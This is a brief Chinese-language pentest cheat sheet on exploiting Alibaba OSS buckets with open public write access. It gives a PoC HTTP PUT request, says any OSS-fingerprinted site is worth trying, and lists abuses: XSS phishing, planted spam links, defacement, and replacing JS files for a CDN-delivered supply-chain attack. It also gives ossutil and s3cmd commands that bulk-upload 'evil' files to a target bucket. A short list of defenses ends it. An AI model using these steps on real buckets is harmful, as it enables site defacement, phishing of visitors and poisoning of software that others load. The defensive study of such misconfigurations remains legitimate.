# OSS 任意文件上传

## 原理
OSS 存储桶未设置身份验证，允许通过 PUT 请求直接上传任意文件

## 检测
指纹为 OSS 的网站都可以尝试
有些网站有 403，也可能能上传

## 测试
```http
PUT /poc.json HTTP/1.1
Host: target-bucket.oss-cn-hangzhou.aliyuncs.com
Content-Length: 32

{"id": "poc"}
```
返回 200 → 存在任意文件上传
通过 GET 方式访问上传的文件验证

## 利用场景
```
支持 HTML 解析 → XSS 钓鱼、挂暗链、挂黑页
静态资源投毒 → 替换 JS 文件实现供应链攻击
上传恶意脚本 → 结合 CDN 分发恶意文件
```

## 批量上传
```bash
# 使用 ossutil（阿里云）
ossutil cp -r ./evil/ oss://target-bucket/
ossutil cp index.html oss://target-bucket/

# 使用 s3cmd（AWS）
s3cmd put evil.js s3://target-bucket/
s3cmd cp index.html s3://target-bucket/
```

## 防御
```
1. 禁止公共写（配置桶策略）
2. 使用 IAM 角色而非开放 PUT
3. 启用 OSS 防盗链和白名单
4. 使用预签名 URL 上传
5. 设置 CORS 策略限制来源
```